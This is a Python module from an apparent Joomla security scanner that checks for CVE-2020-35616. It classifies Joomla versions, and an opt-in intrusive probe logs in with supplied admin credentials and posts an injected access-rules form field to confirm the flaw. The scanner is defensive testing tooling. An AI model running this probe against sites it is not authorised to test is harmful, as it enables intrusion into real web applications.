from __future__ import annotations

import html
import re
from typing import Any

from ...core.args import aggressive_value
from ...core.auth import joomla_admin_login
from ...core.http import HttpClient, normalize_url
from ...core.models import Confidence, Finding, Status
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding

CVE_ID = "CVE-2020-35616"
NAME = "Joomla core write ACL violation"
AFFECTED_RULE = "Joomla 1.7.0 through 3.9.22 (ACL rulesets in multiple core views)"
REMEDIATION = "Upgrade to Joomla 3.9.23 or a newer supported release and review ACL rulesets."
EDIT_PATH = "/administrator/index.php?option=com_content&task=article.edit&id={id}"
SAVE_PATH = "/administrator/index.php?option=com_content"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.DETECTED_VERSION_UNKNOWN
    if parsed < parse_version_required("1.7.0"):
        return Status.NOT_AFFECTED
    if parsed >= parse_version_required("3.9.23"):
        return Status.PATCHED
    return Status.LIKELY_VULNERABLE


def _form_fields(body: str) -> dict[str, str]:
    """Collect editable form fields, skipping dynamically disabled ones."""
    fields: dict[str, str] = {}
    for tag in re.findall(r"<(?:input|select|textarea)[^>]*>", body):
        if "disabled" in tag.lower():
            continue
        name = re.search(r'name="([^"]+)"', tag)
        if not name:
            continue
        key = html.unescape(name.group(1))
        value = re.search(r'value="([^"]*)"', tag)
        fields.setdefault(key, html.unescape(value.group(1)) if value else "")
    return fields


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> Finding:
    """Read-only-in-effect check of the article form's rules handling.

    Submits a benign rules value on a disposable lab item. On an affected
    release the rules field reaches validation and produces an invalid-field
    error; on a fixed release it is stripped before validation and the save
    succeeds. No permission is actually persisted by this probe.
    """
    base = normalize_url(target_url)
    user = aggressive_value(aggressive_args, aggressive_command, "admin_user")
    password = aggressive_value(aggressive_args, aggressive_command, "admin_password")
    article_id = (
        aggressive_value(aggressive_args, aggressive_command, "article_id", "1") or "1"
    )
    acl_group = aggressive_value(aggressive_args, aggressive_command, "acl_group", "")
    permission = (
        aggressive_value(aggressive_args, aggressive_command, "acl_permission", "core.edit")
        or "core.edit"
    )

    evidence: dict[str, Any] = {
        "article_id": article_id,
        "acl_group": acl_group,
        "permission": permission,
    }
    if not user or not password or not acl_group:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            evidence=evidence,
            detail=(
                "The ACL rules check needs --aggressive-arg admin_user=..., admin_password=... "
                "and acl_group=<disposable group id> in an isolated lab."
            ),
            action=REMEDIATION,
        )

    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    if not joomla_admin_login(
        client, "", user, password, timeout=timeout, strict_status=False
    ):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            evidence=evidence,
            detail="The supplied low-privileged test account could not reach the administrator area.",
            action=REMEDIATION,
        )

    edit_path = EDIT_PATH.format(id=article_id)
    form = client.get(edit_path, timeout=timeout)
    token = extract_csrf_from_html(str(form.get("body", "")))
    evidence.update({"form_status": form.get("status", 0), "token_present": bool(token)})
    if not token:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            evidence=evidence,
            detail="The article edit form did not expose a session CSRF token.",
            action=REMEDIATION,
        )

    fields = _form_fields(str(form.get("body", "")))
    fields.update(
        {
            "jform[catid]": "2",
            "jform[state]": "1",
            "jform[language]": "*",
            "option": "com_content",
            "task": "article.save",
            "id": article_id,
            f"jform[rules][{acl_group}][{permission}]": "1",
        }
    )
    response = client.post(SAVE_PATH, fields=fields, timeout=timeout)
    body = str(response.get("body", ""))
    rules_error = bool(re.search(r"Invalid field:\s*JFIELD_RULES_LABEL", body))
    messages = re.findall(r'<div class="alert-message">\s*(.*?)\s*</div>', body)
    evidence.update(
        {
            "save_status": response.get("status", 0),
            "rules_validation_error": rules_error,
            "messages": [m[:120] for m in messages[:5]],
        }
    )
    if rules_error:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{edit_path}",
            evidence=evidence,
            detail=(
                "The submitted access-rules value reached validation on the affected release "
                "(invalid-field error for the rules field); a fixed release strips it before "
                "validation and saves the item normally. No permission was persisted."
            ),
            action=REMEDIATION,
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="Joomla core",
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{edit_path}",
        evidence=evidence,
        detail=(
            "The rules value did not reach validation (no invalid-rules-field error). "
            "On a fixed release this is expected because the rules field is stripped."
        ),
        action=REMEDIATION,
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation=REMEDIATION,
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This module supports only the isolated-lab aggressive rules check."
        return result
    if result.status not in {Status.LIKELY_VULNERABLE, Status.INCONCLUSIVE}:
        result.detail += " Active check skipped because the detected Joomla release is not affected."
        return result
    probe = run_aggressive_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        aggressive_args=aggressive_args,
        aggressive_command=aggressive_command,
    )
    probe.component_version = joomla_version
    return probe


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["1.7.0-3.9.22"],
        "exploit_available": True,
        "exploit_modes": ["aggressive"],
        "intrusive": True,
        "vulnerability_type": "Improper Access Control",
        "module_version": "2.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2020-35616",
            "https://developer.joomla.org/security-centre/834-20201107-core-write-acl-violation-in-multiple-core-views.html",
        ],
    }
